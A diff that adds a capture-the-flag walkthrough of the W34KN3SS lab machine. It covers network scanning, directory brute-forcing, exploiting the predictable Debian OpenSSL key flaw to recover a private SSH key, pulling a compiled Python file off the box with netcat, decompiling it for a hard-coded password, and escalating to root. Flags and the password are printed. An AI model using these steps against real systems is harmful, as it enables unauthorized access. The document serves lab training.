@@ -1,0 +1,156 @@
+1. Netdiscover -i eth0 -r 172.16.16.0/24
+172.16.16.1     52:54:00:12:35:00      1      60  Unknown vendor                                                                                                             
+ 172.16.16.2     52:54:00:12:35:00      1      60  Unknown vendor                                                                                                             
+ 172.16.16.3     08:00:27:38:b7:ba      1      60  PCS Systemtechnik GmbH                                                                                                     
+ 172.16.16.17    08:00:27:8a:64:80      1      60  PCS Systemtechnik GmbH     
+
+2. nmap 172.16.16.17 **quick scan**
+root@hostmachine:~/Downloads# nmap 172.16.16.17
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-26 13:07 CDT
+Nmap scan report for 172.16.16.17
+Host is up (0.00021s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+
+3. nmap -sV -vv -A -p- 172.16.16.17 **background longer scan**
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d (RSA)
+|   256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 (ECDSA)
+|_  256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo
+
+
+4. gobuster -u 172.16.16.17 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/blog (Status: 301)
+/index.html (Status: 200)
+/server-status (Status: 403)
+/test (Status: 301)
+/uploads (Status: 301)
+
+
+I checked out /uploads, and /test. Neither really had anything to offer. Lets check back to the nmap scan in step 3
+
+
+5. In the "commonName" of the cert, you will see that the webserver is looking for "weakness.jth" as the domain name
+
+**add this to /etc/hosts
+172.16.16.17	weakness.jth
+
+
+6. Re-scan the sever
+gobuster -u weakness.jth -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/index.html (Status: 200)
+/private (Status: 301)
+/server-status (Status: 403)
+/robots.txt (Status: 200)
+
+7. While snooping, I thought /private was intresting. There is a pub key listed for root. Also note that /private/files/notes.txt said it was openssl 0.9.8c-1
+
+
+8. Search exploitdb for this version
+searchsploit openssl 0.9.8c-1
+
+**matching data found** I like python, so I copied the python version at /usr/share/exploitdb/exploits/linux/remote/5720.py
+
+9. cp /usr/share/exploitdb/exploits/linux/remote/5720.py openssl_0.9.8.py
+
+10. From reading the manual inside the file, it looks like there is an issue where the generated pattern is perdicatble. It can give you the private key of the public key given to the script. download the source file containing all of the most common openssl keys for that version
+
+11. Download pub key
+wget http://weakness.jth/private/files/mykey.pub
+
+12. Download the databse, and unpack it
+wget https://github.com/g0tmi1k/debian-ssh/blob/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2?raw=true
+tar xvf *.bz2
+
+^^that will take a whie. The list is a bit crazy
+
+13. Compare our key, to the ones listed
+cd rsa
+cat ../mykey.pub
+grep -r "AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw=="
+
+^^grep -r searches all files, and tells you what matches the string^^
+2048/4161de56829de2fe64b9055711f531c1-2537.pub **file matched** Use the private key of this
+2048/4161de56829de2fe64b9055711f531c1-2537
+
+
+14. Log in as user n30
+ssh -i 2048/4161de56829de2fe64b9055711f531c1-2537 n30@172.16.16.17
+
+15. Grab flag 1
+cat user.txt
+25e3cd678875b601425c9356c8039f68
+
+16. cat file code. You will see alot of nonsense. This means it's compiled C, or python
+
+17. Check file type with 'file code'
+n30@W34KN3SS:~$ file code
+code: python 2.7 byte-compiled
+
+18. Copy the file and de-compile it
+nc -nvlp 4444 > code.pyc **listener you your machine** .pyc extension is for compiled python code
+nc -nv 172.16.16.7 4444 < code **transfer file**
+
+install uncompyle6 if not already
+pip install uncompyle6
+pip3 install uncompyle6 
+^^I like to install both python2.x, and python3.x versions^^
+
+uncompyle code.pyc
+
+19. You will see a hard coded string "dMASDNB!!#B!#!#33" Looks like a password if i've ever seen one
+
+**if you are new to python, just remove the hashing variables, and print(inf) and it will give you the string
+
+20. Log in as root
+sudo su -
+**paste in password**
+
+21. Capture the flag
+n30@W34KN3SS:~$ sudo su -
+[sudo] password for n30: 
+root@W34KN3SS:~# cd
+root@W34KN3SS:~# ls -l
+total 4
+-rw-r--r-- 1 root root 33 May  8  2018 root.txt
+root@W34KN3SS:~# cat root.txt 
+a1d2fab76ec6af9b651d4053171e042e
+
+
+22. Rofl at the easter egg
+root@W34KN3SS:~# cat .mysql_history 
+_HiStOrY_V2_
+\134!\040ls\040-la
+\134!\040id
+exit;
+show\040databases;
+exit;
+use\040mysql;
+\134!\040ls\040-la
+exit;
+
+
+
+
+
+
+
+
